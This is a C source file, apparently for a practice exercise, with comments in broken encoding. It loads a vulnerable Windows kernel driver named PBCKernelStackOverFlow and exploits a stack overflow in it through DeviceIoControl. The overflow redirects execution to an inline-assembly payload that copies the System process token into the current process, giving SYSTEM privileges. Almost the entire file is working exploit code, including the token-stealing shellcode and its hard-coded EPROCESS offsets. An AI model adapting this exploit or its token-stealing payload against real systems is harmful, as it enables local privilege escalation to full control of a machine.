#include <windows.h>  
#include <winsvc.h>  
#include <conio.h>  
#include <stdio.h>
#include <winioctl.h>

#define DRIVER_NAME "PBCKernelStackOverFlow"
#define DRIVER_PATH ".\\PBCKernelStackOverFlow.sys"
#define IOCTRL_BASE 0x800
#define MYIOCTRL_CODE(i) \
	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE+i, METHOD_NEITHER,FILE_ANY_ACCESS)

#define CTL_HELLO MYIOCTRL_CODE(0)
#define CTL_PRINT MYIOCTRL_CODE(1)
#define CTL_BYE MYIOCTRL_CODE(2)

#define CurrentThreadOffset 0x124
#define EProcessOffset 0x050
#define FlinkOffset 0x0b8
#define SystemPID 0x04
#define ProcessIdOffset 0x0b4
#define TokenOffset 0x0f8

//װ��NT��������
BOOL LoadDriver(char* lpszDriverName,char* lpszDriverPath)
{
	//char szDriverImagePath[256] = "D:\\DriverTest\\ntmodelDrv.sys";
 	char szDriverImagePath[256] = {0};
 	//�õ�����������·��
 	GetFullPathName(lpszDriverPath, 256, szDriverImagePath, NULL);

	BOOL bRet = FALSE;

	SC_HANDLE hServiceMgr=NULL;//SCM�������ľ��
	SC_HANDLE hServiceDDK=NULL;//NT��������ķ�����

	//�򿪷�����ƹ�����
	hServiceMgr = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

	if( hServiceMgr == NULL )  
	{
		//OpenSCManagerʧ��
		printf( "OpenSCManager() Failed %d ! \n", GetLastError() );
		bRet = FALSE;
		goto BeforeLeave;
	}
	else
	{
		////OpenSCManager�ɹ�
		printf( "OpenSCManager() ok ! \n" );  
	}

	//������������Ӧ�ķ���
	hServiceDDK = CreateService( hServiceMgr,
		lpszDriverName, //�����������ע����е�����  
		lpszDriverName, // ע������������ DisplayName ֵ  
		SERVICE_ALL_ACCESS, // ������������ķ���Ȩ��  
		SERVICE_KERNEL_DRIVER,// ��ʾ���صķ�������������  
		SERVICE_DEMAND_START, // ע������������ Start ֵ  
		SERVICE_ERROR_IGNORE, // ע������������ ErrorControl ֵ  
		szDriverImagePath, // ע������������ ImagePath ֵ  
		NULL,  //GroupOrder HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GroupOrderList
		NULL,  
		NULL,  
		NULL,  
		NULL);  

	DWORD dwRtn;
	//�жϷ����Ƿ�ʧ��
	if( hServiceDDK == NULL )  
	{  
		dwRtn = GetLastError();
		if( dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS )  
		{  
			//��������ԭ�򴴽�����ʧ��
			printf( "CrateService() Failed %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else  
		{
			//���񴴽�ʧ�ܣ������ڷ����Ѿ�������
			printf( "CrateService() Failed Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n" );  
		}

		// ���������Ѿ����أ�ֻ��Ҫ��  
		hServiceDDK = OpenService( hServiceMgr, lpszDriverName, SERVICE_ALL_ACCESS );  
		if( hServiceDDK == NULL )  
		{
			//����򿪷���Ҳʧ�ܣ�����ζ����
			dwRtn = GetLastError();  
			printf( "OpenService() Failed %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else 
		{
			printf( "OpenService() ok ! \n" );
		}
	}  
	else  
	{
		printf( "CrateService() ok ! \n" );
	}

	//�����������
	bRet= StartService( hServiceDDK, NULL, NULL );  
	if( !bRet )  
	{  
		DWORD dwRtn = GetLastError();  
		if( dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING )  
		{  
			printf( "StartService() Failed %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else  
		{  
			if( dwRtn == ERROR_IO_PENDING )  
			{  
				//�豸����ס
				printf( "StartService() Failed ERROR_IO_PENDING ! \n");
				bRet = FALSE;
				goto BeforeLeave;
			}  
			else  
			{  
				//�����Ѿ�����
				printf( "StartService() Failed ERROR_SERVICE_ALREADY_RUNNING ! \n");
				bRet = TRUE;
				goto BeforeLeave;
			}  
		}  
	}
	bRet = TRUE;
//�뿪ǰ�رվ��
BeforeLeave:
	if(hServiceDDK)
	{
		CloseServiceHandle(hServiceDDK);
	}
	if(hServiceMgr)
	{
		CloseServiceHandle(hServiceMgr);
	}
	return bRet;
}

//ж����������  
BOOL UnloadDriver( char * szSvrName )  
{
	BOOL bRet = FALSE;
	SC_HANDLE hServiceMgr=NULL;//SCM�������ľ��
	SC_HANDLE hServiceDDK=NULL;//NT��������ķ�����
	SERVICE_STATUS SvrSta;
	//��SCM������
	hServiceMgr = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );  
	if( hServiceMgr == NULL )  
	{
		//����SCM������ʧ��
		printf( "OpenSCManager() Failed %d ! \n", GetLastError() );  
		bRet = FALSE;
		goto BeforeLeave;
	}  
	else  
	{
		//����SCM������ʧ�ܳɹ�
		printf( "OpenSCManager() ok ! \n" );  
	}
	//����������Ӧ�ķ���
	hServiceDDK = OpenService( hServiceMgr, szSvrName, SERVICE_ALL_ACCESS );  

	if( hServiceDDK == NULL )  
	{
		//����������Ӧ�ķ���ʧ��
		printf( "OpenService() Failed %d ! \n", GetLastError() );  
		bRet = FALSE;
		goto BeforeLeave;
	}  
	else  
	{  
		printf( "OpenService() ok ! \n" );  
	}  
	//ֹͣ�����������ֹͣʧ�ܣ�ֻ�������������ܣ��ٶ�̬���ء�  
	if( !ControlService( hServiceDDK, SERVICE_CONTROL_STOP , &SvrSta ) )  
	{  
		printf( "ControlService() Failed %d !\n", GetLastError() );  
	}  
	else  
	{
		//����������Ӧ��ʧ��
		printf( "ControlService() ok !\n" );  
	} 
	

	//��̬ж����������  

	if( !DeleteService( hServiceDDK ) )  
	{
		//ж��ʧ��
		printf( "DeleteSrevice() Failed %d !\n", GetLastError() );  
	}  
	else  
	{  
		//ж�سɹ�
		printf( "DelServer:deleteSrevice() ok !\n" );  
	}  

	bRet = TRUE;
BeforeLeave:
//�뿪ǰ�رմ򿪵ľ��
	if(hServiceDDK)
	{
		CloseServiceHandle(hServiceDDK);
	}
	if(hServiceMgr)
	{
		CloseServiceHandle(hServiceMgr);
	}
	return bRet;	
} 

VOID getSystemToken(void)
{
	__asm
	{
		pushad;���浱ǰ�̵߳�CPU�ֳ�
		xor eax, eax
		mov eax, fs:[eax + CurrentThreadOffset];��ȡnt!_KPCR.ProbData.CurrentThread
		mov eax, [eax + EProcessOffset];��ȡ��ǰ���̵�EProcess�ṹ��ַ
		mov ecx, eax;eax����ᷢ���ı䣬��ecx������
		mov edx,SystemPID
		searchSystemID:
		mov eax, [eax + FlinkOffset];�ҵ���ǰ�������ڵĽ���������ȡ��һ�����̵�EProcess�ṹָ��
		sub eax, FlinkOffset;���������ҵ���һ�����ĵ�ַ���ڼ�ȥ�����EProcess�ṹ�е�ƫ�ƣ��͵õ�����һ�����̵�EProcess����ʼ��ַ��
		cmp[eax + ProcessIdOffset], edx;�Ƚϵ�ǰ���̵�pid�Ƿ�ΪsystemPid
		jne searchSystemID
		mov edx, [eax + TokenOffset]
		mov[ecx + TokenOffset], edx;�ҵ����滻�����ǵĹ���������
		popad

			pop edi
			pop esi
			pop ebx
			add esp, 0x0c0
			pop ebp
			sub esp,0x10
			pop ebp
			ret 8
	}
}

void AttackDriver()
{
	//������������  
	HANDLE hDevice = CreateFile("\\\\.\\PBCKernelStackOverFlow",  
		GENERIC_WRITE | GENERIC_READ,  
		0,  
		NULL,  
		OPEN_EXISTING,  
		0,  
		NULL);  
	if( hDevice != INVALID_HANDLE_VALUE )  
	{
		printf( "Create Device ok ! \n" );  
	}
	else  
	{
		printf( "Create Device Failed %d ! \n", GetLastError() ); 
		return;
	}

	PULONG Buffer = NULL;
	//����eip
	SIZE_T Size = (512) * sizeof(ULONG) + sizeof(NTSTATUS) + sizeof(DWORD);
	ULONG result = 0;
	PVOID shellCodeAddress = NULL;

	Buffer = (PULONG)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,Size);
	
	RtlFillMemory(Buffer,Size,0x41);
	//test script
	//ULONG index;
	//for (index = 0; index < sizeof(DWORD); index++)
	{
		//*((unsigned char *)((((ULONG)Buffer + Size)) - sizeof(DWORD)) + index) = 0x42;
	}

	shellCodeAddress = (PVOID)(((ULONG)Buffer + Size) - sizeof(ULONG));
	*(PULONG)shellCodeAddress = (ULONG)((PVOID)&getSystemToken);
	printf("Please press any key to send Attack!\n");
	
	getch();
	DeviceIoControl(hDevice, 
		CTL_PRINT, 
		Buffer, 
		Size, 
		NULL, 
		0, 
		&result, 
		NULL);
	
	printf("DeviceIoControl done!\n");
	HeapFree(GetProcessHeap(),0,Buffer);
	CloseHandle( hDevice );
} 

int main(int argc, char* argv[])  
{
	//��������
	BOOL bRet = LoadDriver(DRIVER_NAME,DRIVER_PATH);
	if (!bRet)
	{
		printf("LoadNTDriver error\n");
		return 0;
	}
	//���سɹ�

	printf( "press any key to create device!\n" );  
	getch();  

	AttackDriver();

	//��ʱ�������ͨ��ע����������鿴�������ӵ������֤��  
	printf( "press any key to stop service!\n" );  
	getch();  

	//ж������
	bRet = UnloadDriver(DRIVER_NAME);
	if (!bRet)
	{
		printf("UnloadNTDriver error\n");
		return 0;
	}


	return 0;  
}
